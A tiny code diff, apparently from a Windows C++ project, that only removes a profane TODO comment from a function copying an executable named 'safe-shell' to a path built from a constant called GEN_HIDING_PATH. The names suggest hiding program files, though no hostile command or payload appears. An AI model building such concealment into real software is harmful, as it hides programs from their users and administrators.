@@ -57,7 +57,7 @@ static BYTE movWinkey(void) {
 	return (SUCCESS);
 }
 
-static BYTE moveAdditionalProcesses(void) { // TODO cleanup and refactor that shitty mess
+static BYTE moveAdditionalProcesses(void) {
 	wstring name(L"safe-shell");
 	wstring processPath = getServicePath(name);
 	wstring genericHidingPath = GEN_HIDING_PATH + name + L".exe";
